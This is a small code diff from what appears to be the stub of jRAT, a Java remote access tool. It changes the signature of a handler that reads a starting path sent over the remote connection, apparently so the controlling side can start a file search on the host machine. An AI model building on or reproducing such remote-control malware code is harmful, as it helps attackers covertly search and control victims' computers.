@@ -9,7 +9,7 @@ import se.jrat.stub.FileSearch;
 public class Packet53StartSearch extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String start = Connection.instance.readLine();
 		if (!start.endsWith(File.separator)) {
 			start = start + File.separator;
